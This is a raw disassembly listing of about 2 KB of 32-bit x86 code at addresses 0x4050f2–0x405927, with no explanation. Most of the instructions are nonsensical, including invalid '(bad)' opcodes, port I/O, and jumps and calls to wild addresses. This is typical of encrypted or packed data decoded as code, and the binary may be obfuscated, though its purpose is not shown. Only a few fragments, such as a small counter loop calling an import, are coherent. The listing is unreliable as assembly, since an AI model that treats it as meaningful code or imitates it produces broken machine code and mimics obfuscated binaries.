  4050f2:	shl    BYTE PTR [eax],0x43
  4050f5:	mov    ah,0xbf
  4050f7:	push   eax
  4050f8:	jp     0x4050a5
  4050fa:	es push esp
  4050fc:	mov    ebx,0xe6974101
  405101:	jnp    0x40514e
  405103:	out    dx,al
  405104:	inc    ebx
  405105:	pop    edi
  405106:	inc    edx
  405107:	jp     0x40512c
  405109:	dec    ebp
  40510a:	inc    ebx
  40510b:	jl     0x405137
  40510d:	pop    edi
  40510e:	pop    esi
  40510f:	push   0x4a
  405111:	cmc    
  405112:	aam    0xf1
  405114:	dec    esi
  405115:	mov    ch,0x6c
  405117:	mov    ?,eax
  405119:	cmc    
  40511a:	pop    esi
  40511b:	not    ebx
  40511d:	aaa    
  40511e:	jae    0x40519c
  405120:	shr    dl,1
  405122:	or     BYTE PTR [eax],ah
  405124:	push   ss
  405125:	or     BYTE PTR ds:0x709b35aa,dl
  40512b:	fidivr DWORD PTR [ebp-0x24]
  40512e:	outs   dx,DWORD PTR ds:[esi]
  40512f:	ja     0x405136
  405131:	jp     0x405199
  405133:	and    al,BYTE PTR [ebx+0x73105ae]
  405139:	jecxz  0x405199
  40513b:	scas   eax,DWORD PTR es:[edi]
  40513c:	push   ecx
  40513d:	jae    0x405103
  40513f:	sbb    BYTE PTR [ecx],dl
  405141:	scas   eax,DWORD PTR es:[edi]
  405142:	and    al,0xcc
  405144:	(bad)  
  405145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405146:	out    0x11,eax
  405148:	and    eax,0x92d0757e
  40514d:	mov    ebx,0x9b14ff5a
  405152:	(bad)  
  405153:	cmc    
  405154:	dec    edx
  405155:	mov    bl,BYTE PTR [ecx+0x71]
  405158:	dec    eax
  405159:	jg     0x4051c8
  40515b:	jns    0x405165
  40515d:	je     0x40510b
  40515f:	inc    edx
  405160:	ja     0x40512c
  405162:	sub    eax,0x1e7c7712
  405167:	outs   dx,BYTE PTR ds:[esi]
  405168:	mov    al,0x21
  40516a:	je     0x405155
  40516c:	xchg   DWORD PTR [ebp-0x65],eax
  40516f:	mov    ebx,0xa6eb9d14
  405174:	xlat   BYTE PTR ds:[ebx]
  405175:	rcl    BYTE PTR [ecx+edi*1-0x22dc1828],0xa4
  40517d:	arpl   WORD PTR [edx],di
  40517f:	push   cs
  405180:	or     ah,ch
  405182:	jp     0x4051d0
  405184:	inc    ebp
  405185:	or     al,0x45
  405187:	push   edi
  405188:	add    BYTE PTR [edi],dh
  40518a:	mov    gs,WORD PTR [edi-0x19]
  40518d:	addr16 out dx,eax
  40518f:	lahf   
  405190:	fild   WORD PTR [edx-0x1d378d1d]
  405196:	scas   eax,DWORD PTR es:[edi]
  405197:	jno    0x4051bd
  405199:	pop    ss
  40519a:	mov    edx,0xf0032242
  40519f:	in     al,0x55
  4051a1:	sub    ch,BYTE PTR [ebx-0x47e4524c]
  4051a7:	mov    ch,0x91
  4051a9:	pop    ebp
  4051aa:	(bad)  
  4051ac:	or     DWORD PTR [esp+edi*1-0xa71626d],ebx
  4051b3:	inc    esi
  4051b4:	out    dx,eax
  4051b5:	test   eax,0x9713e153
  4051ba:	pusha  
  4051bb:	into   
  4051bc:	mov    ds:0x3697ff8f,al
  4051c1:	lods   eax,DWORD PTR ds:[esi]
  4051c2:	xchg   ebp,eax
  4051c3:	dec    ecx
  4051c4:	and    al,BYTE PTR [ecx+ecx*4+0x7c9eb65f]
  4051cb:	sahf   
  4051cc:	xor    dl,ch
  4051ce:	cld    
  4051cf:	and    BYTE PTR [eax+0x6cf71a14],0xee
  4051d6:	sbb    ebp,ebx
  4051d8:	sub    eax,0x6253db88
  4051dd:	add    eax,0xe6b279eb
  4051e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051e3:	addr16 ja 0x4051ec
  4051e6:	adc    eax,0x187fee54
  4051eb:	jb     0x4051bb
  4051ed:	cmp    BYTE PTR es:[ebp+ebp*8-0x36],dh
  4051f2:	sbb    DWORD PTR [eax-0x70],0x518d7376
  4051f9:	ret    0x23c7
  4051fc:	scas   eax,DWORD PTR es:[edi]
  4051fd:	mov    ds,esi
  4051ff:	sub    al,0xcc
  405201:	pop    ecx
  405202:	fbld   TBYTE PTR [esi-0x65ef7b73]
  405208:	jb     0x40523c
  40520a:	add    BYTE PTR [ecx+0x45ff0845],cl
  405210:	or     al,0xe9
  405212:	and    edx,edi
  405214:	(bad)  
  405215:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  40521b:	mov    ecx,DWORD PTR [ebp+0x10]
  40521e:	add    eax,esi
  405220:	mov    DWORD PTR [ecx],eax
  405222:	pop    esi
  405223:	leave  
  405224:	ret    0xc
  405227:	push   ebp
  405228:	mov    ebp,esp
  40522a:	jmp    0x4055fe
  40522f:	or     DWORD PTR ds:0x369d361d,0xffffffa3
  405236:	mov    ebp,0x424146fc
  40523b:	jnp    0x4051ed
  40523d:	sub    esp,esi
  40523f:	shr    BYTE PTR [edx],1
  405241:	jl     0x4052bf
  405243:	mov    ch,0x79
  405245:	jl     0x4052c3
  405247:	xchg   edi,eax
  405248:	loope  0x405256
  40524a:	add    dh,BYTE PTR [ebx+0x12515b00]
  405250:	add    al,0x32
  405252:	xchg   edx,eax
  405253:	cs arpl cx,di
  405256:	jge    0x405251
  405258:	jne    0x40526d
  40525a:	in     eax,dx
  40525b:	cmp    eax,0xfba8fd24
  405260:	not    BYTE PTR [esp+ecx*2-0x458d92b4]
  405267:	rol    DWORD PTR [eax+eax*2],1
  40526a:	fcmovu st,st(4)
  40526c:	outs   dx,BYTE PTR ds:[esi]
  40526d:	dec    ecx
  40526e:	ror    esi,1
  405270:	lods   eax,DWORD PTR ds:[esi]
  405271:	jns    0x4052a8
  405273:	pusha  
  405274:	push   esp
  405275:	pusha  
  405276:	push   esp
  405277:	addr16 shl dl,1
  40527a:	in     al,0xb9
  40527c:	cmp    DWORD PTR [edx+0x4],ebp
  40527f:	cs cmc 
  405281:	out    dx,al
  405282:	push   eax
  405283:	push   ebx
  405284:	jns    0x405219
  405286:	test   BYTE PTR [ebp+0x19307677],ah
  40528c:	pusha  
  40528d:	xor    al,cl
  40528f:	je     0x4052eb
  405291:	es dec eax
  405293:	mov    ah,0x80
  405295:	dec    eax
  405296:	popa   
  405297:	sahf   
  405298:	js     0x4052a1
  40529a:	ret    0xf9bf
  40529d:	mov    esi,0x701c4c32
  4052a2:	push   edi
  4052a3:	out    dx,al
  4052a4:	xchg   ebp,eax
  4052a5:	sub    ebx,DWORD PTR [ecx+0x18bf8c8]
  4052ab:	inc    eax
  4052ac:	vpsubusw xmm4,xmm4,XMMWORD PTR [edx+ebp*8]
  4052b1:	xchg   DWORD PTR [esi],ebx
  4052b3:	mov    ch,0x40
  4052b5:	xchg   esi,eax
  4052b6:	add    bl,ah
  4052b8:	lods   eax,DWORD PTR ds:[esi]
  4052b9:	jg     0x4052f1
  4052bb:	arpl   sp,bp
  4052bd:	or     DWORD PTR [edi-0x31de2d81],ecx
  4052c3:	mov    ch,0xd7
  4052c5:	mov    esp,0xb5d2c935
  4052ca:	iret   
  4052cb:	out    dx,al
  4052cc:	mov    cl,0xf9
  4052ce:	call   0x754d09c5
  4052d3:	dec    esp
  4052d4:	mov    BYTE PTR [ecx+0x2cc54b13],dh
  4052da:	and    bl,ah
  4052dc:	(bad)  
  4052de:	push   es
  4052df:	loope  0x405301
  4052e1:	iret   
  4052e2:	xor    DWORD PTR [edi],edi
  4052e4:	fadd   DWORD PTR [esi]
  4052e6:	xchg   bl,ch
  4052e8:	push   ecx
  4052e9:	pop    ss
  4052ea:	sub    BYTE PTR [eax-0x5f0cebf8],bh
  4052f0:	das    
  4052f1:	popa   
  4052f2:	popf   
  4052f3:	les    edi,FWORD PTR [eax+0x53a9acb0]
  4052f9:	out    0x40,al
  4052fb:	test   DWORD PTR [edx],ebp
  4052fd:	push   eax
  4052fe:	xchg   ebp,eax
  4052ff:	adc    dh,BYTE PTR [esi]
  405301:	cs push 0xae79b325
  405307:	and    esp,ecx
  405309:	aad    0x49
  40530b:	cwde   
  40530c:	cmp    esp,DWORD PTR [eax]
  40530e:	jne    0x405367
  405310:	and    bh,ah
  405312:	stos   BYTE PTR es:[edi],al
  405313:	inc    esi
  405314:	push   ebp
  405315:	sbb    eax,0x4a3404f3
  40531a:	neg    DWORD PTR [edi+0x75334cc]
  405320:	fwait
  405321:	daa    
  405322:	gs pushw ds
  405325:	dec    ebx
  405326:	test   edx,ecx
  405328:	push   0xffffff9f
  40532a:	xor    eax,0x43a6e97b
  40532f:	test   al,0xcc
  405331:	out    0x27,al
  405333:	jo     0x4052c4
  405335:	icebp  
  405336:	or     BYTE PTR [edx-0x4],cl
  405339:	push   0xb1ee4dc7
  40533e:	add    al,0x18
  405340:	inc    esp
  405341:	pop    ebx
  405342:	sahf   
  405343:	xor    BYTE PTR [ecx-0x5e],bh
  405346:	fild   DWORD PTR [ecx+0x6a]
  405349:	fistp  DWORD PTR [edi+0x59]
  40534c:	inc    eax
  40534d:	inc    esi
  40534e:	xor    eax,0x49ebd6b4
  405353:	push   eax
  405354:	pop    ecx
  405355:	retf   0x208f
  405358:	push   ds
  405359:	repz std 
  40535b:	pop    esp
  40535c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40535d:	and    DWORD PTR [edi+0x53],esp
  405360:	cld    
  405361:	jg     0x405392
  405363:	cld    
  405364:	pop    ebx
  405365:	lock xchg DWORD PTR [ebp-0x55602184],eax
  40536c:	lods   eax,DWORD PTR ds:[esi]
  40536d:	aaa    
  40536e:	or     eax,0xacb6ae0e
  405373:	ror    BYTE PTR [edi-0xe],0x3c
  405377:	sahf   
  405378:	push   es
  405379:	(bad)  
  40537a:	fmul   DWORD PTR [ebp-0x464578c5]
  405380:	mov    al,ds:0x4346bbfd
  405385:	jbe    0x4053ba
  405387:	test   eax,0x98b3d766
  40538c:	test   edi,0x25221083
  405392:	add    BYTE PTR [edi],ah
  405394:	xchg   BYTE PTR [edx],cl
  405396:	prefetchwt1 (bad)
  405397:	or     eax,0xdc7a7d4
  40539c:	sar    esi,cl
  40539e:	popf   
  40539f:	push   ecx
  4053a0:	icebp  
  4053a1:	es das 
  4053a3:	in     al,0x6e
  4053a5:	fistp  DWORD PTR [eax-0xf]
  4053a8:	sbb    BYTE PTR [eax-0x3f],cl
  4053ab:	add    eax,0x599061b7
  4053b0:	fsubr  DWORD PTR [esi+0x3b]
  4053b3:	aad    0xf
  4053b5:	or     eax,0x1f657b79
  4053ba:	call   0x77301b69
  4053bf:	cmc    
  4053c0:	sbb    ebp,DWORD PTR [edi+0x5110ff0]
  4053c6:	jno    0x40539d
  4053c8:	dec    edx
  4053c9:	inc    ecx
  4053ca:	sahf   
  4053cb:	lahf   
  4053cc:	push   0x3e7e28f5
  4053d1:	sub    BYTE PTR [edx+0x1d],cl
  4053d4:	ss fcomp st(1)
  4053d7:	adc    esp,ecx
  4053d9:	call   0xdd7d179e
  4053de:	sub    eax,esi
  4053e0:	ret    
  4053e1:	mov    dl,0xfa
  4053e3:	inc    ebx
  4053e4:	mov    eax,ds:0xbd17f25a
  4053e9:	jns    0x405405
  4053eb:	je     0x4053ef
  4053ed:	retf   
  4053ee:	sub    al,0x57
  4053f0:	mov    BYTE PTR [esi-0x2c],0xe8
  4053f4:	dec    ebp
  4053f5:	cmp    esp,edi
  4053f7:	sbb    DWORD PTR es:[edx-0x26],ebp
  4053fb:	mov    eax,ds:0x547fd913
  405400:	hlt    
  405401:	ss add eax,0xe5f53ab9
  405407:	xor    eax,0x83480117
  40540c:	data16 es jae 0x405424
  405410:	adc    DWORD PTR [esi+0x37],edi
  405413:	cmp    al,0x44
  405415:	fwait
  405416:	sbb    bh,BYTE PTR [edx]
  405418:	sbb    BYTE PTR [ecx+0x2c6a6b50],bl
  40541e:	cwde   
  40541f:	leave  
  405420:	add    ch,BYTE PTR [esi]
  405422:	rol    DWORD PTR cs:[eax+0x47a2db4c],cl
  405429:	xchg   ecx,eax
  40542a:	das    
  40542b:	fst    st(1)
  40542d:	call   0x5474:0x2a8d7a0a
  405434:	addr16 push esi
  405436:	repnz and ecx,edx
  405439:	bound  eax,QWORD PTR [ebx+0x6f8eb8ca]
  40543f:	je     0x405474
  405441:	js     0x405435
  405443:	fdiv   DWORD PTR [eax+0xd]
  405446:	shr    DWORD PTR [ebx],cl
  405448:	int3   
  405449:	push   edx
  40544a:	push   esi
  40544b:	jnp    0x4053e9
  40544d:	xchg   esi,eax
  40544e:	(bad)
  405452:	ins    BYTE PTR es:[edi],dx
  405453:	pop    es
  405454:	and    ecx,DWORD PTR [edi+0x61]
  405457:	into   
  405458:	inc    esi
  405459:	push   eax
  40545a:	in     eax,0x1a
  40545c:	mov    al,BYTE PTR [ebp+0x6a]
  40545f:	clc    
  405460:	adc    ch,BYTE PTR [esi+ecx*2]
  405463:	in     al,dx
  405464:	mov    al,0xef
  405466:	inc    ebx
  405467:	dec    DWORD PTR [eax-0x5e]
  40546a:	dec    ebx
  40546b:	in     al,0xea
  40546d:	push   ebp
  40546e:	xor    ebp,DWORD PTR [ecx-0x762ff8ef]
  405474:	push   es
  405475:	repnz sub DWORD PTR [edx+esi*2-0x2156e6f2],edi
  40547d:	fcom   QWORD PTR [edx+esi*2+0x4b28f166]
  405484:	ins    BYTE PTR es:[edi],dx
  405485:	adc    BYTE PTR [edx-0x64],ch
  405488:	aaa    
  405489:	dec    ebx
  40548a:	ja     0x405498
  40548c:	rol    bh,cl
  40548e:	out    dx,al
  40548f:	jge    0x40548c
  405491:	pop    ebx
  405492:	mov    DWORD PTR [edx-0x78],ecx
  405495:	jmp    0x40545c
  405497:	push   edx
  405498:	sbb    BYTE PTR [ebp-0x4f],dh
  40549b:	rcr    DWORD PTR [esi],1
  40549d:	inc    eax
  40549e:	xor    al,0x4e
  4054a0:	enter  0x1a17,0x47
  4054a4:	nop    DWORD PTR [ebx]
  4054a7:	loopne 0x4054ea
  4054a9:	mov    ebp,esi
  4054ab:	cmp    eax,0x2b3a5cdb
  4054b0:	xchg   esi,eax
  4054b1:	daa    
  4054b2:	jge    0x405454
  4054b4:	fs ds and bl,al
  4054b8:	int3   
  4054b9:	xchg   edx,eax
  4054ba:	jno    0x405471
  4054bc:	push   esi
  4054bd:	inc    ebp
  4054be:	cmc    
  4054bf:	daa    
  4054c0:	push   cs
  4054c1:	mov    ebx,DWORD PTR [edi+0xe616e35]
  4054c7:	ret    
  4054c8:	and    ebp,esp
  4054ca:	inc    ebx
  4054cb:	outs   dx,BYTE PTR ds:[esi]
  4054cc:	sub    BYTE PTR [edx],bh
  4054ce:	add    esp,0x750dbb7d
  4054d4:	adc    DWORD PTR [edx],ebx
  4054d6:	cld    
  4054d7:	fstcw  WORD PTR [esi-0x75]
  4054db:	ror    ecx,1
  4054dd:	aas    
  4054de:	call   0x5022:0xc9c9655a
  4054e5:	hlt    
  4054e6:	pop    ds
  4054e7:	xchg   BYTE PTR [eax+0x204c7165],bh
  4054ed:	nop
  4054ee:	mov    ebp,0x96e78ec4
  4054f3:	iret   
  4054f4:	mov    al,ds:0x4526d5af
  4054f9:	adc    eax,0xa6d0655
  4054fe:	push   eax
  4054ff:	sub    ch,BYTE PTR [edi-0x6]
  405502:	call   0x2a4ea30f
  405507:	and    dh,BYTE PTR [esi-0x1c]
  40550a:	mov    ah,BYTE PTR [edi-0x52b2bc01]
  405510:	jb     0x405514
  405512:	dec    ebp
  405513:	shr    BYTE PTR [edi],cl
  405515:	fs scas eax,DWORD PTR es:[edi]
  405517:	adc    BYTE PTR [edi-0x19],ah
  40551a:	retf   
  40551b:	jo     0x405532
  40551d:	or     eax,DWORD PTR [esi-0x74747260]
  405523:	ret    0xaee7
  405526:	rcl    eax,1
  405528:	frstor [ecx]
  40552a:	sub    eax,0x65822ac7
  40552f:	and    eax,0xb883fb75
  405534:	sbb    bh,BYTE PTR [ebx+eax*4-0x3b]
  405538:	mov    DWORD PTR cs:[esi+0x4f],ebx
  40553c:	xchg   bp,ax
  40553e:	xor    esi,ecx
  405540:	cwde   
  405541:	sahf   
  405542:	lods   eax,DWORD PTR ds:[esi]
  405543:	shr    BYTE PTR [edx-0x1be02660],1
  405549:	in     eax,dx
  40554a:	std    
  40554b:	(bad)
  40554e:	sbb    dh,bh
  405550:	addr16 cwde 
  405552:	sbb    al,0xbb
  405554:	and    al,0xcf
  405556:	out    0xf,al
  405558:	xor    BYTE PTR [ebx-0x20],ah
  40555b:	leave  
  40555c:	jmp    0xdc0d:0x44e7fbe9
  405563:	jnp    0x405581
  405565:	push   0x411bbb7d
  40556a:	(bad)  
  40556b:	dec    eax
  40556c:	pop    ss
  40556d:	retf   0xdd68
  405570:	xor    ecx,DWORD PTR [ebx+edi*2-0x473d516b]
  405577:	(bad)  
  405578:	push   esp
  405579:	sbb    BYTE PTR [ebp+0xd],al
  40557c:	sbb    eax,0xce3c3f84
  405581:	loopne 0x4055aa
  405583:	mov    bh,0x54
  405585:	sub    DWORD PTR [edi+ebx*4],0x87dddb38
  40558c:	xchg   ecx,eax
  40558d:	and    al,0x20
  40558f:	xchg   BYTE PTR [edx+0x69],dl
  405592:	mov    bl,cl
  405594:	inc    esp
  405595:	pop    esi
  405596:	jbe    0x4055d3
  405598:	pop    ss
  405599:	sub    BYTE PTR [ecx-0x42b61b4d],dl
  40559f:	adc    bh,ah
  4055a1:	sub    ecx,DWORD PTR [edi+ebp*1]
  4055a4:	aad    0xb0
  4055a6:	aas    
  4055a7:	imul   ecx,DWORD PTR [ebp+0x1755d30e],0xdb054d9d
  4055b1:	mov    esp,DWORD PTR [ebx]
  4055b3:	cmp    esi,DWORD PTR [ecx+0x11]
  4055b6:	pop    ss
  4055b7:	jo     0x405570
  4055b9:	fimul  WORD PTR [esi-0x46]
  4055bc:	mov    al,0x55
  4055be:	jmp    0x405638
  4055c0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4055c2:	es add edx,ebp
  4055c5:	(bad)  
  4055c6:	gs mov eax,eax
  4055c9:	mov    dh,0x7f
  4055cb:	xlat   BYTE PTR ds:[ebx]
  4055cc:	iret   
  4055cd:	inc    ebx
  4055ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055cf:	pop    esi
  4055d0:	sbb    ecx,edx
  4055d2:	dec    edx
  4055d3:	mov    esi,0x210813fb
  4055d8:	xchg   ebp,eax
  4055d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055da:	mov    edx,0x429550e4
  4055df:	daa    
  4055e0:	pop    esi
  4055e1:	cld    
  4055e2:	and    dl,BYTE PTR [ebx+0xc]
  4055e5:	pop    edx
  4055e6:	sub    DWORD PTR [esp+esi*2],0x6f4f0ace
  4055ed:	fild   WORD PTR [edx]
  4055ef:	dec    BYTE PTR [esi-0x34f466f9]
  4055f5:	pusha  
  4055f6:	arpl   ax,bp
  4055f8:	neg    dl
  4055fa:	jnp    0x4055df
  4055fc:	and    ah,BYTE PTR [esi+0x51]
  4055ff:	push   ecx
  405600:	and    DWORD PTR ds:0x433663,0x0
  40560a:	mov    eax,ds:0x433663
  40560f:	inc    eax
  405610:	mov    ds:0x433663,eax
  405615:	cmp    DWORD PTR ds:0x433663,0x4
  40561c:	jne    0x405630
  405622:	push   0x6994
  405627:	push   DWORD PTR [ebp-0xc]
  40562a:	call   DWORD PTR ds:0x412254
  405630:	cmp    DWORD PTR ds:0x433663,0x3
  405637:	jne    0x405648
  40563d:	mov    eax,ds:0x433663
  405642:	inc    eax
  405643:	mov    ds:0x433663,eax
  405648:	cmp    DWORD PTR ds:0x433663,0x12
  40564f:	jb     0x40560a
  405655:	sbb    edx,ecx
  405657:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40565e:	jmp    0x405a32
  405663:	xchg   ecx,eax
  405664:	dec    ebx
  405665:	xor    eax,0xbd71fd91
  40566a:	dec    ebx
  40566b:	rcl    DWORD PTR [esi+0x1d],1
  40566e:	push   esi
  40566f:	lods   eax,DWORD PTR ds:[esi]
  405670:	sbb    DWORD PTR [eax+0x63],0x7c7c3609
  405677:	mov    ch,0x79
  405679:	jl     0x4056f7
  40567b:	dec    esp
  40567c:	test   eax,0x82883f41
  405681:	cmp    ebp,DWORD PTR [ebx+0x441cc90]
  405687:	fucomi st,st(1)
  405689:	mov    al,cs:0x6c29eed2
  40568f:	jb     0x40562e
  405691:	pushf  
  405692:	cli    
  405693:	ficomp DWORD PTR [edx*4-0x2165fa38]
  40569a:	adc    BYTE PTR [edx],dh
  40569c:	xchg   edi,eax
  40569d:	js     0x405647
  40569f:	pusha  
  4056a0:	loope  0x405665
  4056a2:	sbb    eax,0x7f238b21
  4056a7:	je     0x405727
  4056a9:	jns    0x40568f
  4056ab:	pop    ecx
  4056ac:	and    DWORD PTR [esi-0x37f58dd5],ecx
  4056b2:	xchg   BYTE PTR [ebx],bl
  4056b4:	xor    esi,DWORD PTR [ebp+0x29]
  4056b7:	sbb    eax,0x13d91698
  4056bc:	out    0xff,eax
  4056be:	and    BYTE PTR [ebx+eax*1],dl
  4056c1:	int    0x41
  4056c3:	mov    esi,0x749e1d74
  4056c8:	mov    ch,0xbb
  4056ca:	ret    
  4056cb:	popa   
  4056cc:	add    ebx,DWORD PTR [ecx+0x37978b4c]
  4056d2:	sbb    edi,DWORD PTR [ebx]
  4056d4:	mov    al,ds:0x9096c94e
  4056d9:	pop    esp
  4056da:	sahf   
  4056db:	adc    ebx,DWORD PTR [edx-0x71]
  4056de:	fsub   DWORD PTR [edx+0x42]
  4056e1:	jae    0x405672
  4056e3:	push   edi
  4056e4:	out    0x3,eax
  4056e6:	mov    edx,0xcaeeb32b
  4056eb:	and    DWORD PTR [ecx+eax*2+0x687703c1],esi
  4056f2:	jmp    0x405686
  4056f4:	test   DWORD PTR [eax+0x1df74206],eax
  4056fa:	push   esi
  4056fb:	jns    0x40568b
  4056fd:	add    DWORD PTR [eax+0x49a35a1],esp
  405703:	adc    BYTE PTR [ecx-0x19],cl
  405706:	pusha  
  405707:	test   eax,0x223162ec
  40570c:	adc    DWORD PTR [eax+0x27efdba0],esp
  405712:	mov    cl,0x9a
  405714:	push   0xffffffb1
  405716:	sbb    eax,esi
  405718:	xchg   DWORD PTR fs:[eax],ebx
  40571b:	js     0x405725
  40571d:	popf   
  40571e:	ja     0x405771
  405720:	sbb    DWORD PTR [eax+0x57856f48],0x6f
  405727:	mov    ss,WORD PTR [esi+0x46eea421]
  40572d:	jbe    0x40579f
  40572f:	pop    edi
  405730:	cdq    
  405731:	xor    BYTE PTR [edx],ah
  405733:	stc    
  405734:	test   BYTE PTR [ebp-0x57],bl
  405737:	sbb    eax,0x989bab37
  40573c:	out    0x1a,al
  40573e:	icebp  
  40573f:	mov    bl,0x14
  405741:	aad    0xe3
  405743:	dec    esp
  405744:	sub    eax,0x92c5486d
  405749:	repz dec edx
  40574b:	or     eax,0xfe1f0a13
  405750:	jae    0x4057a4
  405752:	ss es cli 
  405755:	fcomp  QWORD PTR [edx]
  405757:	dec    esp
  405758:	inc    ebx
  405759:	bound  ecx,QWORD PTR [ebp+0x69606d4b]
  40575f:	imul   ecx,esi,0x85b85b68
  405765:	and    ah,BYTE PTR [ecx+0x743a0f20]
  40576b:	or     eax,0x7c45f5d2
  405770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405771:	xchg   esp,eax
  405772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405773:	jp     0x405724
  405775:	sub    DWORD PTR [edi+0xc58fff7],ecx
  40577b:	add    bh,0xf1
  40577e:	cmp    ebp,eax
  405780:	mov    BYTE PTR [ecx],dh
  405782:	(bad)  
  405783:	mov    edi,0xf603f56a
  405788:	mov    ?,eax
  40578a:	mov    eax,0x152e1e34
  40578f:	adc    eax,0xb4e9afca
  405794:	arpl   WORD PTR [ebp-0x2d048c57],si
  40579a:	push   cs
  40579b:	xor    eax,0x9e8bf6a0
  4057a0:	je     0x405753
  4057a2:	add    BYTE PTR [eax+0x73ce5209],al
  4057a8:	pop    esi
  4057a9:	mov    al,0xd0
  4057ab:	arpl   WORD PTR [ebx-0x27],dx
  4057ae:	inc    esi
  4057af:	repnz mov edx,0xbb98aa17
  4057b5:	out    0x26,al
  4057b7:	mov    eax,0xa484c48
  4057bc:	mov    cs,ecx
  4057be:	inc    edx
  4057bf:	das    
  4057c0:	aaa    
  4057c1:	iret   
  4057c2:	push   ds
  4057c3:	pusha  
  4057c4:	icebp  
  4057c5:	in     eax,dx
  4057c6:	sub    al,0xc8
  4057c8:	jno    0x4057ad
  4057ca:	ds iret 
  4057cc:	jo     0x4057ed
  4057ce:	data16 jp 0x405778
  4057d1:	je     0x4057c8
  4057d3:	cmp    BYTE PTR [edx+0x62],ch
  4057d6:	jo     0x405795
  4057d8:	aaa    
  4057d9:	cmp    al,0x75
  4057db:	mov    ah,0x91
  4057dd:	inc    ecx
  4057de:	das    
  4057df:	mov    BYTE PTR [edx-0x22],ah
  4057e2:	fistp  QWORD PTR [esi]
  4057e4:	push   0x7bcf81c3
  4057e9:	mov    ecx,0x6f0c7507
  4057ee:	pop    es
  4057ef:	mov    edi,0x20caaf8d
  4057f4:	sbb    al,0x22
  4057f6:	test   DWORD PTR [ebp-0x1d],esi
  4057f9:	daa    
  4057fa:	inc    edx
  4057fb:	in     al,0x40
  4057fd:	std    
  4057fe:	cmp    eax,0xc1e4b68f
  405803:	popf   
  405804:	add    al,ch
  405806:	xchg   BYTE PTR [edi-0x10],ah
  405809:	ret    0x5706
  40580c:	fucomp st(6)
  40580e:	jmp    0x1c4a65e6
  405813:	int3   
  405814:	xor    eax,0x5b4e383a
  405819:	mov    ebx,0x3f39fc40
  40581e:	mov    ebp,0xd01e0634
  405823:	mov    eax,DWORD PTR [eax+esi*4-0x5535c359]
  40582a:	mov    ch,0xf4
  40582c:	out    0x21,al
  40582e:	push   eax
  40582f:	add    cl,BYTE PTR [ecx]
  405831:	push   ecx
  405832:	iret   
  405833:	cmp    dl,BYTE PTR [edx+0x27fb0ceb]
  405839:	push   esi
  40583a:	and    eax,0x18d41cf2
  40583f:	lods   eax,DWORD PTR ds:[esi]
  405840:	pushf  
  405841:	shl    DWORD PTR [eax+esi*1+0x796906b7],0x0
  405849:	inc    eax
  40584a:	pop    esi
  40584b:	scas   eax,DWORD PTR es:[edi]
  40584c:	sbb    cl,BYTE PTR [eax-0x72f34c32]
  405852:	mov    ds:0x47e3712e,eax
  405857:	sub    dh,dl
  405859:	das    
  40585a:	dec    eax
  40585b:	leave  
  40585c:	(bad)  
  40585d:	mov    esi,0xb9190cc2
  405862:	stos   BYTE PTR es:[edi],al
  405863:	outs   dx,BYTE PTR ds:[esi]
  405864:	mov    ds:0x5aea9bce,eax
  405869:	xchg   edx,eax
  40586a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40586b:	xchg   DWORD PTR [edx],esi
  40586d:	loopne 0x405876
  40586f:	mov    ds:0xa2c90674,eax
  405874:	mov    ecx,0x2f42f69e
  405879:	push   cs
  40587a:	mov    ecx,0xeaebdb7c
  40587f:	in     al,dx
  405880:	or     al,0x38
  405882:	(bad)  
  405883:	fiadd  WORD PTR [edx+0x3dfcd6d7]
  405889:	pop    ebx
  40588a:	pop    es
  40588b:	les    eax,FWORD PTR [eax+0x6d]
  40588e:	add    al,0xd7
  405890:	mov    ecx,ebx
  405892:	outs   dx,BYTE PTR ds:[esi]
  405893:	pop    ebp
  405894:	popa   
  405895:	jno    0x4058f3
  405897:	dec    ecx
  405898:	inc    edi
  405899:	(bad)  
  40589a:	sub    cl,ah
  40589c:	push   ebp
  40589d:	sub    ch,BYTE PTR [ecx-0x31]
  4058a0:	cld    
  4058a1:	mov    ebp,0xdb377b6e
  4058a7:	data16 mov cl,0x9b
  4058aa:	rol    BYTE PTR [edx-0x61bfcdaf],cl
  4058b0:	bound  eax,QWORD PTR [ecx+0x72]
  4058b3:	push   ebp
  4058b4:	montmul (bad)
  4058b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058b6:	inc    edx
  4058b7:	jae    0x405899
  4058b9:	sbb    dl,dl
  4058bb:	add    DWORD PTR [eax+0x79c40034],ecx
  4058c1:	ret    
  4058c2:	icebp  
  4058c3:	(bad)  
  4058c4:	loopne 0x40589b
  4058c6:	enter  0x39a1,0x50
  4058ca:	pop    ecx
  4058cb:	jp     0x40590e
  4058cd:	mov    ds:0xfb63e181,al
  4058d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058d3:	imul   esi,esi,0x0
  4058d6:	pop    ebx
  4058d7:	loop   0x4058f8
  4058d9:	jne    0x40591b
  4058db:	push   esp
  4058dc:	std    
  4058dd:	adc    ch,BYTE PTR [ebx-0x57067d0c]
  4058e3:	or     edx,esi
  4058e5:	icebp  
  4058e6:	jae    0x4058e8
  4058e8:	cmp    ecx,ebx
  4058ea:	inc    edx
  4058eb:	fcom   DWORD PTR [ecx+edi*2+0x74236c92]
  4058f2:	jns    0x4058cd
  4058f4:	xor    DWORD PTR [ecx+0x1],0x54d6c695
  4058fb:	xor    eax,DWORD PTR [ebp+0x77]
  4058fe:	ror    BYTE PTR [edx],cl
  405900:	or     BYTE PTR [ebp+0x51ded443],ch
  405906:	mov    edx,0xda751088
  40590b:	out    0xed,eax
  40590d:	shr    BYTE PTR [edx-0x12239568],1
  405913:	sahf   
  405914:	outs   dx,BYTE PTR ds:[esi]
  405915:	out    0x96,eax
  405917:	stc    
  405918:	or     ecx,DWORD PTR [edi-0xa56cfbf]
  40591e:	loope  0x40599a
  405920:	popf   
  405921:	ror    DWORD PTR [edx+0x2b0c30fc],1
  405927:	pop    edi
